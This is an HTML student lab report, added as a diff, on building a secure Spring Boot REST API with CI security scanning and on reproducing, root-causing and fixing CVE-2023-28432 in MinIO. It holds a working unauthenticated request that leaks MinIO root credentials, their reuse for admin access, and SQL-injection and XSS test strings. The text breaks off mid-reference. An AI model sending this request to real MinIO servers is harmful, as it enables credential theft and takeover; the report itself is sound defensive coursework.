@@ -1,0 +1,699 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<title>Work 1 — Secure REST API and CVE-2023-28432</title>
+<style>
+@page { size: A4; margin: 17mm 16mm 18mm 16mm; }
+* { box-sizing: border-box; }
+html { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+body {
+  margin: 0; color: #17202a;
+  font-family: "Segoe UI", "Helvetica Neue", Arial, sans-serif;
+  font-size: 10.2pt; line-height: 1.5;
+}
+a { color: #0b5cad; text-decoration: none; }
+p { margin: 0 0 7pt; text-align: justify; }
+h1, h2, h3, h4 { color: #102a43; page-break-after: avoid; }
+h1 { font-size: 20pt; border-bottom: 2px solid #102a43; padding-bottom: 4pt; margin: 16pt 0 10pt; }
+h2 { font-size: 15pt; margin: 18pt 0 8pt; border-bottom: 1px solid #bcccdc; padding-bottom: 3pt; }
+h3 { font-size: 11.8pt; margin: 13pt 0 5pt; }
+h4 { font-size: 10.6pt; margin: 10pt 0 4pt; }
+ul, ol { margin: 4pt 0 8pt 16pt; padding: 0; }
+li { margin: 2pt 0; }
+table { border-collapse: collapse; width: 100%; margin: 7pt 0 10pt; font-size: 9pt; page-break-inside: avoid; }
+th, td { border: 1px solid #aebdcc; padding: 4pt 6pt; vertical-align: top; text-align: left; }
+th { background: #eaf1f8; color: #102a43; }
+code { font-family: "SFMono-Regular", Menlo, Consolas, monospace; font-size: 8.8pt; background: #f2f4f7; padding: 1pt 2pt; border-radius: 2pt; }
+pre { background: #f6f8fa; border: 1px solid #d0d7de; border-radius: 4pt; padding: 7pt 9pt; margin: 6pt 0 9pt; page-break-inside: avoid; }
+pre code { background: none; padding: 0; font-size: 8.1pt; line-height: 1.35; white-space: pre-wrap; word-break: break-word; }
+img { display: block; max-width: 100%; max-height: 10.8cm; margin: 8pt auto 3pt; border: 1px solid #d0d7de; page-break-inside: avoid; }
+p > img + em, p > img { page-break-inside: avoid; }
+.page-break { page-break-before: always; }
+.title-page { text-align: center; padding-top: 48mm; page-break-after: always; }
+.title-page .course { font-size: 13pt; letter-spacing: 1.2pt; color: #486581; margin-bottom: 22mm; text-align: center; }
+.title-page h1 { font-size: 27pt; border: none; margin: 0 0 7mm; padding: 0; page-break-after: avoid; }
+.title-page h2 { font-size: 15.5pt; border: none; margin: 0 0 9mm; padding: 0; line-height: 1.35; page-break-after: avoid; }
+.title-page .subtitle { font-size: 12pt; color: #334e68; margin-bottom: 16mm; text-align: center; }
+.title-page .meta { width: 72%; margin: 0 auto 12mm; font-size: 10.5pt; border: none; }
+.title-page .meta td { border: none; padding: 3pt 8pt; text-align: left; }
+.title-page .meta td:first-child { color: #486581; width: 34%; text-align: right; }
+.title-page .repo { font-size: 8.2pt; color: #52606d; line-height: 1.5; text-align: center; word-break: break-all; }
+@media print { a { color: #102a43; } }
+</style></head>
+<body><div class="title-page">
+<p class="course">Information Security</p>
+<h1>Laboratory Work No. 1</h1>
+<h2>Secure REST API Development with CI/CD and<br>Real CVE Vulnerability Analysis</h2>
+<p class="subtitle">CVE-2023-28432 — MinIO Cluster Information Disclosure</p>
+<table class="meta">
+<tr><td>Variant</td><td>[Variant number]</td></tr>
+<tr><td>Student</td><td>[Surname, Name]</td></tr>
+<tr><td>HDU number</td><td>[HDU number]</td></tr>
+<tr><td>Group</td><td>CS4</td></tr>
+<tr><td>Date</td><td>20 October 2026</td></tr>
+</table>
+<p class="repo">Public repository: https://github.com/Enahaha/infs-work1-secure-api<br>
+Last successful pipeline: https://github.com/Enahaha/infs-work1-secure-api/actions/runs/39237435374</p>
+</div>
+
+<h2 id="contents">Contents</h2>
+<ol>
+<li><a href="#1-purpose">Purpose</a></li>
+<li><a href="#2-secure-api-development">Secure API development</a></li>
+<li><a href="#3-cicd-and-security-scanning">CI/CD and security scanning</a></li>
+<li><a href="#4-cve-2023-28432-reproduction-root-cause-and-fix">CVE-2023-28432: reproduction, root cause and fix</a></li>
+<li><a href="#5-conclusion">Conclusion</a></li>
+<li><a href="#6-references">References</a></li>
+<li><a href="#appendix-a-reproduction-commands">Appendix A: reproduction commands</a></li>
+<li><a href="#appendix-b-evidence-index">Appendix B: evidence index</a></li>
+</ol>
+<div class="page-break"></div>
+
+<h2 id="1-purpose">1. Purpose</h2>
+<p>The purpose of this laboratory work is to go through the complete secure
+software development lifecycle in one project: build a REST API with protection
+against common OWASP Top 10 issues, integrate static and dependency security
+scanners into a CI/CD pipeline, and then reproduce, analyse and remediate a real
+CVE in an isolated Vulhub environment.</p>
+<p>The work has two parts:</p>
+<ul>
+<li><strong>Part A — secure API and CI/CD.</strong> A Spring Boot notes API with JWT
+  authentication, BCrypt password hashing, SQL-injection protection, HTML output
+  escaping, integration tests, SpotBugs/FindSecBugs SAST and OWASP
+  Dependency-Check SCA.</li>
+<li><strong>Part B — real CVE.</strong> CVE-2023-28432, an unauthenticated information
+  disclosure in distributed MinIO deployments. The vulnerable three-node
+  cluster is started with Docker Compose, the root credentials are leaked, the
+  leaked credentials are used to obtain administrative access, the root cause is
+  identified in the MinIO source, the environment is upgraded to the fixed
+  release, and the attack is shown to fail while normal storage operations still
+  work.</li>
+</ul>
+<p>The complete source code and evidence are in the public repository
+<a href="https://github.com/Enahaha/infs-work1-secure-api">https://github.com/Enahaha/infs-work1-secure-api</a>. The successful pipeline is
+<a href="https://github.com/Enahaha/infs-work1-secure-api/actions/runs/39237435374">https://github.com/Enahaha/infs-work1-secure-api/actions/runs/39237435374</a>.</p>
+<h2 id="2-secure-api-development">2. Secure API development</h2>
+<h3 id="21-stack-and-architecture">2.1 Stack and architecture</h3>
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>Choice</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Language / runtime</td>
+<td>Java 17</td>
+</tr>
+<tr>
+<td>Framework</td>
+<td>Spring Boot 4.1.1 (Spring MVC, Spring Security)</td>
+</tr>
+<tr>
+<td>Build</td>
+<td>Maven</td>
+</tr>
+<tr>
+<td>Persistence</td>
+<td>Spring Data JPA + H2 file database</td>
+</tr>
+<tr>
+<td>Authentication</td>
+<td>RS256 JWT, Spring Security OAuth2 resource server</td>
+</tr>
+<tr>
+<td>Password hashing</td>
+<td>BCrypt, cost 12</td>
+</tr>
+<tr>
+<td>Tests</td>
+<td>JUnit 5, Spring Boot Test, MockMvc</td>
+</tr>
+</tbody>
+</table>
+<p>The application has two entities: <code>UserAccount</code> (username and BCrypt hash) and
+<code>Note</code> (owner ID, content, creation time). Two demo users, <code>alice</code> and <code>bob</code>, are
+created on first start from the <code>APP_DEMO_PASSWORD</code> environment variable. Only
+BCrypt hashes are stored.</p>
+<h3 id="22-api-endpoints">2.2 API endpoints</h3>
+<table>
+<thead>
+<tr>
+<th>Method</th>
+<th>Path</th>
+<th>Authentication</th>
+<th>Behaviour</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>POST</code></td>
+<td><code>/auth/login</code></td>
+<td>Public</td>
+<td>Accepts <code>login</code> and <code>password</code>; returns a JWT on success, HTTP 401 otherwise</td>
+</tr>
+<tr>
+<td><code>GET</code></td>
+<td><code>/api/data</code></td>
+<td>Bearer JWT</td>
+<td>Returns only the notes owned by the authenticated user</td>
+</tr>
+<tr>
+<td><code>POST</code></td>
+<td><code>/api/notes</code></td>
+<td>Bearer JWT</td>
+<td>Creates a note for the authenticated user (self-designed endpoint)</td>
+</tr>
+</tbody>
+</table>
+<p>Login:</p>
+<pre><code class="language-bash">curl -i -X POST http://127.0.0.1:8080/auth/login \
+  -H 'Content-Type: application/json' \
+  -d '{&quot;login&quot;:&quot;alice&quot;,&quot;password&quot;:&quot;Local-demo-2026!&quot;}'
+</code></pre>
+<p>Successful response: HTTP 200 with <code>token</code>, <code>tokenType: Bearer</code> and
+<code>expiresIn: 1800</code>.</p>
+<p>Create a note:</p>
+<pre><code class="language-bash">TOKEN='&lt;token&gt;'
+curl -i -X POST http://127.0.0.1:8080/api/notes \
+  -H &quot;Authorization: Bearer $TOKEN&quot; \
+  -H 'Content-Type: application/json' \
+  -d '{&quot;content&quot;:&quot;My first secure note&quot;}'
+</code></pre>
+<p>Response: HTTP 201. The <code>ownerId</code> is taken from the verified JWT; a
+client-supplied owner is ignored.</p>
+<p>Read notes:</p>
+<pre><code class="language-bash">curl -i http://127.0.0.1:8080/api/data \
+  -H &quot;Authorization: Bearer $TOKEN&quot;
+</code></pre>
+<p>Response: HTTP 200 with only the caller's notes. Without a token the same
+request returns HTTP 401.</p>
+<p><img alt="Figure 1. Login returns HTTP 200 and a JWT." src="../screenshots/api/01_login_success_200.png" /></p>
+<p><strong>Figure 1.</strong> Login with the demo user returns a signed JWT.</p>
+<p><img alt="Figure 2. Access without a token is rejected with HTTP 401." src="../screenshots/api/04_get_notes_without_token_401.png" /></p>
+<p><strong>Figure 2.</strong> <code>GET /api/data</code> without an <code>Authorization</code> header returns HTTP 401.</p>
+<h3 id="23-security-measures">2.3 Security measures</h3>
+<h4 id="sql-injection">SQL injection</h4>
+<p><code>UserAccountRepository</code> and <code>NoteRepository</code> use Spring Data derived queries.
+The framework binds the method arguments as JDBC parameters; no SQL string is
+built by concatenating user input:</p>
+<pre><code class="language-java">public interface UserAccountRepository extends JpaRepository&lt;UserAccount, Long&gt; {
+    Optional&lt;UserAccount&gt; findByUsername(String username);
+}
+
+public interface NoteRepository extends JpaRepository&lt;Note, Long&gt; {
+    List&lt;Note&gt; findByOwnerIdOrderByIdAsc(Long ownerId);
+}
+</code></pre>
+<p>The integration test <code>passwordsAreHashedAndWrongCredentialsAreRejected</code> submits
+the username <code>' OR '1'='1</code> and verifies HTTP 401. The recorded API test also
+shows the injection-style login attempt being rejected.</p>
+<h4 id="cross-site-scripting">Cross-site scripting</h4>
+<p>Note content is stored as entered and HTML-escaped when it is returned:</p>
+<pre><code class="language-java">public record NoteResponse(Long id, String content, Instant createdAt) {
+    static NoteResponse from(Note note) {
+        return new NoteResponse(
+            note.getId(),
+            HtmlUtils.htmlEscape(note.getContent()),
+            note.getCreatedAt());
+    }
+}
+</code></pre>
+<p>The test <code>loginCreateAndReadEscapeHtmlAndIsolateOwners</code> submits
+<code>&lt;script&gt;alert('x')&lt;/script&gt;</code> and verifies that the JSON response contains
+<code>&amp;lt;script&amp;gt;alert(&amp;#39;x&amp;#39;)&amp;lt;/script&amp;gt;</code>.</p>
+<p><img alt="Figure 3. Script markup is escaped in the response." src="../screenshots/api/07_create_note_xss_escaped_201.png" /></p>
+<p><strong>Figure 3.</strong> A note containing <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> is returned as
+HTML-escaped text.</p>
+<p>HTML escaping is appropriate for the HTML-text context of this API. It is not a
+substitute for context-specific encoding in JavaScript, CSS or URL contexts, and
+clients must not decode the value and insert it as raw HTML.</p>
+<h4 id="authentication-and-authorization">Authentication and authorization</h4>
+<ul>
+<li>Passwords are hashed with <strong>BCrypt cost 12</strong>; plaintext passwords are never
+  stored or logged.</li>
+<li>A successful login issues an <strong>RS256 JWT</strong> with <code>iss</code>, <code>aud</code>, <code>sub</code>, <code>iat</code> and
+  <code>exp</code>. The subject is the user ID, and the token expires after 1800 seconds.</li>
+<li>The resource-server filter validates the signature, expiration, issuer,
+  audience and a positive numeric subject on every protected request.</li>
+<li>The API is stateless and accepts tokens only from the <code>Authorization: Bearer</code>
+  header. Cookie authentication, HTTP Basic and form login are not configured.</li>
+<li>The test <code>cookiesAndHttpBasicDoNotAuthenticateRequests</code> verifies that a valid
+  JWT placed in a cookie does not authenticate a request, that Basic credentials
+  do not authenticate a request, and that an explicit Bearer token does.</li>
+<li>CSRF protection is disabled because the API does not use browser-automatic
+  credentials. The rationale is documented in <code>docs/SECURITY_REVIEW.md</code>; the
+  same test checks the stateless behaviour.</li>
+<li>Unknown usernames still perform a BCrypt comparison against a dummy hash, and
+  unknown-user and wrong-password failures return the same HTTP 401 message.</li>
+</ul>
+<h4 id="additional-controls">Additional controls</h4>
+<ul>
+<li>Bean Validation limits login, password and note fields; malformed JSON returns
+  HTTP 400 without a stack trace.</li>
+<li>The H2 console is disabled and the server binds to <code>127.0.0.1</code>.</li>
+<li>Spring Security supplies <code>X-Content-Type-Options: nosniff</code>,
+  <code>X-Frame-Options: DENY</code> and cache-control headers.</li>
+</ul>
+<h3 id="24-functional-tests">2.4 Functional tests</h3>
+<pre><code class="language-bash">mvn test
+</code></pre>
+<p>Result: <strong>7 tests, 0 failures, 0 errors</strong>. The tests cover login and token
+issuance, BCrypt storage, wrong credentials, SQL-injection-style input,
+unauthenticated access, expired/tampered/wrong-issuer/wrong-audience tokens,
+note creation and reading, cross-user isolation, HTML escaping, field validation
+and malformed JSON.</p>
+<h2 id="3-cicd-and-security-scanning">3. CI/CD and security scanning</h2>
+<h3 id="31-pipeline">3.1 Pipeline</h3>
+<p>The workflow is <code>.github/workflows/ci.yml</code>. It runs automatically on every push,
+on every pull request and on manual dispatch. Two jobs run in parallel:</p>
+<table>
+<thead>
+<tr>
+<th>Job</th>
+<th>Tool</th>
+<th>Failure condition</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Tests and SAST</td>
+<td>JUnit / Spring Boot, SpotBugs 4.10.5.0 + FindSecBugs 1.14.0</td>
+<td>Test failure; any non-excluded <code>SECURITY</code>-category finding; analysis error</td>
+</tr>
+<tr>
+<td>Dependency vulnerability scan (SCA)</td>
+<td>OWASP Dependency-Check 12.2.2</td>
+<td>CVSS ≥ 7 finding; scan error</td>
+</tr>
+</tbody>
+</table>
+<p>The SAST job scans the <code>SECURITY</code> category at every confidence level. Four
+initial findings were reviewed. Three <code>SPRING_ENDPOINT</code> entries are endpoint
+inventory rather than vulnerabilities, and the
+<code>SPRING_CSRF_PROTECTION_DISABLED</code> warning does not apply to a stateless
+Bearer-only API. Two narrow exceptions are documented in
+<code>config/spotbugs-reviewed.xml</code> and <code>docs/SECURITY_REVIEW.md</code>; all other security
+rules remain enabled. The exceptions do not claim that the application is free
+of vulnerabilities.</p>
+<p>The SCA job includes test-scope dependencies. The NVD data source is enabled;
+OSS Index is disabled because it requires separate credentials. When the
+optional <code>NVD_API_KEY</code> secret is absent, the script uses the official
+Dependency-Check NVD data feed mirror. A scan error or a CVSS ≥ 7 finding fails
+the job; the threshold and error checks are not relaxed.</p>
+<h3 id="32-latest-successful-run">3.2 Latest successful run</h3>
+<ul>
+<li>Run: <a href="https://github.com/Enahaha/infs-work1-secure-api/actions/runs/39237435374">https://github.com/Enahaha/infs-work1-secure-api/actions/runs/39237435374</a></li>
+<li>Commit: <code>50b16bb</code></li>
+<li>Result: <strong>success</strong>, both jobs passed</li>
+<li>Tests and SAST: 7 tests passed; 0 SAST findings; 0 analysis errors</li>
+<li>SCA: 70 unique dependencies (134 in total); <strong>0 vulnerable dependencies</strong></li>
+</ul>
+<p><img alt="Figure 4. GitHub Actions: both jobs passed." src="../screenshots/ci/01_github_actions_all_checks_passed_39237435374.png" /></p>
+<p><strong>Figure 4.</strong> The successful GitHub Actions run with both security jobs.</p>
+<p><img alt="Figure 5. SAST report: 0 findings, 0 errors." src="../screenshots/ci/02_sast_report.png" /></p>
+<p><strong>Figure 5.</strong> The SAST report rendered from the actual <code>spotbugsXml.xml</code>.</p>
+<p><img alt="Figure 6. SCA report: 0 vulnerable dependencies." src="../screenshots/ci/03_sca_report_summary.png" /></p>
+<p><strong>Figure 6.</strong> The Dependency-Check summary: 70 unique dependencies, 0
+vulnerabilities.</p>
+<h3 id="33-dependency-remediation">3.3 Dependency remediation</h3>
+<p>Dependency-Check found 11 vulnerabilities in the transitive
+<code>tomcat-embed-core</code> 11.0.24, 9 of them with CVSS ≥ 7. The build failed as
+designed. <code>pom.xml</code> now sets <code>tomcat.version=11.0.27</code>; the after-fix scan
+reports 0 vulnerable dependencies. The before/after HTML and JSON reports and
+the scan logs are archived in <code>docs/security-reports/local/</code> and are summarized
+in <code>docs/DEPENDENCY_REMEDIATION.md</code>. This is a real example of the SCA gate
+finding and verifying a fix, not a synthetic exercise.</p>
+<h2 id="4-cve-2023-28432-reproduction-root-cause-and-fix">4. CVE-2023-28432: reproduction, root cause and fix</h2>
+<h3 id="41-vulnerability-overview">4.1 Vulnerability overview</h3>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE</td>
+<td>CVE-2023-28432</td>
+</tr>
+<tr>
+<td>CVSS v3.1</td>
+<td><strong>7.5 High</strong> — <code>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</code></td>
+</tr>
+<tr>
+<td>CWE</td>
+<td>CWE-200 (Exposure of Sensitive Information)</td>
+</tr>
+<tr>
+<td>Affected</td>
+<td>MinIO distributed deployments from <code>RELEASE.2019-12-17T23-16-33Z</code> to before <code>RELEASE.2023-03-20T20-16-18Z</code></td>
+</tr>
+<tr>
+<td>Fixed</td>
+<td><code>RELEASE.2023-03-20T20-16-18Z</code></td>
+</tr>
+<tr>
+<td>Lab</td>
+<td>Vulhub <code>minio/CVE-2023-28432</code>, three-node cluster</td>
+</tr>
+</tbody>
+</table>
+<p>In distributed mode, MinIO nodes use an internal bootstrap endpoint to check
+that they share the same <code>MINIO_*</code> environment variables. In vulnerable
+releases, <code>POST /minio/bootstrap/v1/verify</code> returned the complete
+<code>ServerSystemConfig</code>, including a <code>MinioEnv</code> map of environment variables. The
+denylist did not exclude the root credentials, so an unauthenticated client
+could read <code>MINIO_ROOT_USER</code> and <code>MINIO_ROOT_PASSWORD</code> in plaintext.</p>
+<h3 id="42-vulnerable-environment">4.2 Vulnerable environment</h3>
+<p>The Vulhub compose file starts three MinIO nodes. Node1 exposes the S3 API on
+port 9000 and the web console on port 9001; nodes 2 and 3 are internal cluster
+members. The image is <code>vulhub/minio:2023-02-27T18-10-45Z</code>, which reports:</p>
+<pre><code class="language-text">minio version RELEASE.2023-02-27T18-10-45Z (commit-id=0ff931dc765d5d8fdddcdf7687fec1b0b194fca9)
+Runtime: go1.19.6 linux/amd64
+</code></pre>
+<p>The cluster starts with:</p>
+<pre><code class="language-bash">cd vulhub/minio/CVE-2023-28432
+docker compose up -d
+</code></pre>
+<p><code>GET /minio/health/live</code> returns HTTP 200 and the console returns HTTP 200 when
+the cluster is ready.</p>
+<p><img alt="Figure 7. The vulnerable three-node cluster." src="../screenshots/cve/01_vulnerable_cluster.png" /></p>
+<p><strong>Figure 7.</strong> The running 3-node MinIO cluster and the vulnerable release.</p>
+<h3 id="43-reproduction-and-impact">4.3 Reproduction and impact</h3>
+<p>No credentials, cookies or S3 signatures are required:</p>
+<pre><code class="language-bash">curl -i -X POST http://127.0.0.1:9000/minio/bootstrap/v1/verify
+</code></pre>
+<p>The vulnerable server returns HTTP 200 and a JSON body. The relevant part of the
+actual response is:</p>
+<pre><code class="language-json">&quot;MinioEnv&quot;: {
+  &quot;MINIO_ROOT_USER&quot;: &quot;minioadmin&quot;,
+  &quot;MINIO_ROOT_PASSWORD&quot;: &quot;minioadmin-vulhub&quot;,
+  &quot;MINIO_ACCESS_KEY_FILE&quot;: &quot;access_key&quot;,
+  &quot;MINIO_SECRET_KEY_FILE&quot;: &quot;secret_key&quot;,
+  &quot;...&quot;: &quot;...&quot;
+}
+</code></pre>
+<p><img alt="Figure 8. Unauthenticated disclosure of the MinIO root credentials." src="../screenshots/cve/02_exploit_env_leak.png" /></p>
+<p><strong>Figure 8.</strong> The actual unauthenticated response, with the leaked root
+credentials highlighted.</p>
+<p>The leaked credentials are accepted by the web console:</p>
+<pre><code class="language-bash">curl -i -X POST http://127.0.0.1:9001/api/v1/login \
+  -H 'Content-Type: application/json' \
+  -d '{&quot;accessKey&quot;:&quot;minioadmin&quot;,&quot;secretKey&quot;:&quot;minioadmin-vulhub&quot;}'
+</code></pre>
+<p>Result: HTTP 204 with a session cookie. The session lists all buckets. Using the
+same credentials through the MinIO client creates a bucket:</p>
+<pre><code class="language-text">Bucket created successfully `leaked/attacker-bucket-033200`.
+[2026-10-20 03:32:00 UTC]     0B attacker-bucket-033200/
+[2026-10-20 03:29:54 UTC]     0B cve-proof-bucket/
+[2026-10-20 03:30:53 UTC]     0B regression-bucket/
+</code></pre>
+<p><img alt="Figure 9. Leaked credentials grant administrative access." src="../screenshots/cve/03_leaked_creds_impact.png" /></p>
+<p><strong>Figure 9.</strong> The leaked credentials log in to the console and create a bucket.</p>
+<p>This demonstrates loss of confidentiality and administrative write access. In a
+real deployment, the same credentials would allow reading, modifying or deleting
+objects, changing bucket policies and creating or removing users. Integrity and
+availability are not directly affected by the disclosure itself, but they follow
+from the administrative access obtained with the leaked credentials.</p>
+<h3 id="44-root-cause">4.4 Root cause</h3>
+<p>In <code>cmd/bootstrap-peer-server.go</code> at
+<code>RELEASE.2023-02-27T18-10-45Z</code>, <code>getServerSystemCfg()</code> builds <code>MinioEnv</code> from
+every environment variable beginning with <code>MINIO_</code>, skipping only a small
+denylist:</p>
+<pre><code class="language-go">var skipEnvs = map[string]struct{}{
+    &quot;MINIO_OPTS&quot;:         {},
+    &quot;MINIO_CERT_PASSWD&quot;:  {},
+    &quot;MINIO_SERVER_DEBUG&quot;: {},
+    &quot;MINIO_DSYNC_TRACE&quot;:  {},
+}
+</code></pre>
+<p>The root credentials were not in that list, and the values were copied verbatim:</p>
+<pre><code class="language-go">envValues[envK] = env.Get(envK, &quot;&quot;)
+</code></pre>
+<p>The handler had no caller authentication:</p>
+<pre><code class="language-go">func (b *bootstrapRESTServer) VerifyHandler(w http.ResponseWriter, r *http.Request) {
+    ctx := newContext(r, w, &quot;VerifyHandler&quot;)
+    cfg := getServerSystemCfg()
+    logger.LogIf(ctx, json.NewEncoder(w).Encode(&amp;cfg))
+}
+</code></pre>
+<p>The route is registered on the bootstrap router under
+<code>/minio/bootstrap/v1/verify</code>. It is served on the same listener as the S3 API,
+but the S3 request-signature middleware does not cover this reserved internal
+path. The handler therefore accepted requests from any client that could reach
+port 9000 and returned the configuration before any authentication check.</p>
+<p>This is an access-control and data-exposure design error (CWE-200), not a
+memory-safety bug. The vulnerable code combined three mistakes: an internal
+endpoint was exposed on a public listener, the endpoint did not authenticate its
+caller, and the response included secrets because the denylist was incomplete.</p>
+<p>The upstream fix is commit
+<a href="https://github.com/minio/minio/commit/3b5dbf90468b874e99253d241d16d175c2454077"><code>3b5dbf9</code></a>
+("allow bootstrapping to validate internode tokens"). It adds the four
+sensitive keys to <code>skipEnvs</code>, hashes the remaining environment values, and calls
+<code>storageServerRequestValidate(r)</code> before building the response:</p>
+<pre><code class="language-go">if err := storageServerRequestValidate(r); err != nil {
+    b.writeErrorResponse(w, err)
+    return
+}
+</code></pre>
+<p><code>storageServerRequestValidate</code> in <code>cmd/storage-rest-server.go</code> extracts a
+Bearer JWT, verifies it with the cluster's active secret key, requires the
+access key or subject to match the active credential, requires the audience to
+equal the URL raw query, and requires the <code>X-Minio-Time</code> header to be within 15
+minutes. Only a real storage-server peer can produce such a token.</p>
+<p><img alt="Figure 10. Upstream fix diff." src="../screenshots/cve/04_fix_diff.png" /></p>
+<p><strong>Figure 10.</strong> The upstream diff: sensitive keys are skipped and hashed, and the
+verify handler validates an internode JWT.</p>
+<h3 id="45-applied-fix">4.5 Applied fix</h3>
+<p>The lab fix upgrades the image in <code>docker-compose.yml</code> from the vulnerable
+release to the first fixed release:</p>
+<pre><code class="language-yaml">services:
+  node1:
+    image: minio/minio:RELEASE.2023-03-20T20-16-18Z
+    command:
+      - server
+      - --console-address
+      - :9001
+      - http://node1:9000/mnt/data1
+      - http://node2:9000/mnt/data2
+      - http://node3:9000/mnt/data3
+    environment:
+      - MINIO_ROOT_USER=minioadmin
+      - MINIO_ROOT_PASSWORD=minioadmin-vulhub
+</code></pre>
+<p>The same image and command are used for node2 and node3. The complete fixed
+file is included in the submission folder
+<code>fixes/CVE-2023-28432/docker-compose.yml</code>. The official image uses <code>server ...</code>
+as the command; its entrypoint prepends <code>minio</code>. The Vulhub image used
+<code>minio server ...</code>.</p>
+<p>Apply and restart:</p>
+<pre><code class="language-bash">cd vulhub/minio/CVE-2023-28432
+docker compose down
+docker compose up -d
+</code></pre>
+<p>The fixed server reports <code>RELEASE.2023-03-20T20-16-18Z</code>. The fix is effective
+for three reasons:</p>
+<ol>
+<li>the fixed release contains the upstream denylist and hashing change, so the
+   root credentials are no longer serialized into <code>MinioEnv</code>;</li>
+<li>the fixed <code>VerifyHandler</code> requires an internode JWT, so an unauthenticated
+   caller is rejected before the configuration is built;</li>
+<li>the upgrade removes the vulnerable code instead of merely hiding the route.
+   A reverse proxy or firewall rule blocking the path would be a compensating
+   control, but it would leave the vulnerable binary running.</li>
+</ol>
+<p>Because the credentials may have leaked before the upgrade, a real incident
+response should also rotate the root credentials and review access logs. The lab
+keeps the Vulhub defaults to make the reproduction deterministic.</p>
+<h3 id="46-verification">4.6 Verification</h3>
+<p>Repeat the exact request from Section 4.3:</p>
+<pre><code class="language-bash">curl -i -X POST http://127.0.0.1:9000/minio/bootstrap/v1/verify
+</code></pre>
+<p>Actual result:</p>
+<pre><code class="language-text">HTTP/1.1 403 Forbidden
+Content-Type: text/plain; charset=utf-8
+Content-Length: 17
+
+JWT token missing
+</code></pre>
+<p>No environment variables and no credentials are returned. The attack no longer
+works.</p>
+<p><img alt="Figure 11. The attack is blocked after the upgrade." src="../screenshots/cve/05_exploit_blocked.png" /></p>
+<p><strong>Figure 11.</strong> The same unauthenticated request receives HTTP 403 from the fixed
+release.</p>
+<h3 id="47-regression-testing">4.7 Regression testing</h3>
+<p>The fix must not break normal object-storage functionality. The following
+checks were run after the upgrade:</p>
+<ol>
+<li><code>GET /minio/health/live</code> returns HTTP 200.</li>
+<li>Web-console login returns HTTP 204; the bucket list returns HTTP 200.</li>
+<li><code>mc mb</code> creates <code>regression-bucket-033200</code>.</li>
+<li><code>mc cp</code> uploads a 35-byte object and <code>mc cat</code> returns its content:
+   <code>regression-ok 2026-10-20T03:31:19Z</code>.</li>
+<li>The buckets created before the fix (<code>cve-proof-bucket</code>,
+   <code>attacker-bucket-033200</code>) are still present and readable; the fixed cluster
+   lists four buckets.</li>
+</ol>
+<p><img alt="Figure 12. Normal MinIO functionality after the fix." src="../screenshots/cve/06_regression_after_fix.png" /></p>
+<p><strong>Figure 12.</strong> Bucket creation, object upload/download and console login all
+work after the fix.</p>
+<h3 id="48-discussion">4.8 Discussion</h3>
+<p>The vulnerability is a good example of a security problem that is not caused by
+a memory corruption or a missing input filter. The endpoint was intentionally
+internal, but it was exposed on a public listener, lacked authentication, and
+returned a configuration object whose denylist was incomplete. Each of these
+would be a defensible design decision in isolation; together they produced a
+high-severity credential leak.</p>
+<p>The fix is also instructive because it uses defence in depth: the response no
+longer contains plaintext secrets, and the handler now requires a valid
+internode token. Either layer would reduce the impact; together they remove the
+vulnerability and make accidental regression less likely. The regression tests
+show that hardening the internal endpoint does not break the public S3 API or
+the cluster bootstrap process.</p>
+<h2 id="5-conclusion">5. Conclusion</h2>
+<p>Work 1 produced a working secure API, an automated security pipeline and a
+complete real-CVE case study:</p>
+<ul>
+<li><strong>API functionality:</strong> login, authenticated data retrieval and note creation
+  are implemented and tested. The API returns correct status codes and isolates
+  users' notes.</li>
+<li><strong>Security measures:</strong> Spring Data parameter binding prevents SQL injection;
+  HTML escaping protects the HTML-text output context; BCrypt protects
+  passwords; RS256 JWT authentication with issuer/audience/expiry/subject
+  validation protects the endpoints. Cookie and Basic authentication are
+  rejected, and the CSRF exception is documented and tested.</li>
+<li><strong>CI/CD:</strong> GitHub Actions runs tests, SpotBugs/FindSecBugs SAST and OWASP
+  Dependency-Check SCA on every push and pull request. The latest successful run
+  has 7 passing tests, 0 SAST findings, and 0 vulnerable dependencies after a
+  real Tomcat CVE remediation.</li>
+<li><strong>CVE-2023-28432:</strong> the vulnerable MinIO cluster was started, the
+  unauthenticated environment leak was reproduced, the leaked root credentials
+  were used to obtain admin access and create a bucket, the root cause was
+  traced to the missing denylist entries and missing caller authentication, the
+  environment was upgraded to the fixed release, the attack was blocked with
+  HTTP 403, and regression tests confirmed that bucket and object operations
+  and the console still work.</li>
+</ul>
+<p>The submitted repository contains the code, the CI configuration, the CVE
+write-up, the source diff, the evidence and the fixed compose file in
+<code>fixes/CVE-2023-28432/</code>. The main limitations are the educational nature of the
+API (random JWT key per start, no refresh/logout/rate limiting, local H2
+database) and the fact that SAST/SCA passing does not prove the absence of
+vulnerabilities.</p>
+<h2 id="6-references">6. References</h2>
+<ol>
+<li>Laboratory manual, Work 1: Secure REST API Development with CI/CD and Real
+   CVE Vulnerability Analysis.</li>
+<li>OWASP Top 10 — <a href="https://owasp.org/www-project-top-ten/">https://owasp.org/www-project-top-ten/</a></li>
+<li>OWASP Cheat Sheet Series — <a href="https://cheatsheetseries.owasp.org/">https://cheatsheetseries.owasp.org/</a></li>
+<li>Spring Security JWT resource server —
+   <a href="https://docs.spring.io/spring-security/reference/servlet/oauth2/resource-server/jwt.html">https://docs.spring.io/spring-security/reference/servlet/oauth2/resource-server/jwt.html</a></li>
+<li>GitHub Actions — <a href="https://docs.github.com/en/actions">https://docs.github.com/en/actions</a></li>
+<li>OWASP Dependency-Check — <a href="https://dependency-check.github.io/DependencyCheck/">https://dependency-check.github.io/DependencyCheck/</a></li>
+<li>SpotBugs — <a href="https://spotbugs.github.io/">https://spotbugs.github.io/</a></li>
+<li>FindSecBugs — <a href="https://github.com/find-sec-bugs/find-sec-bugs">https://github.com/find-sec-bugs/find-sec-bugs</a></li>
+<li>NVD — CVE-2023-28432 — <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-28432">https://nvd.nist.gov/vuln/detail/CVE-2023-28432</a></li>
+<li>MinIO advisory GHSA-6xvq-wj2x-3h3q —
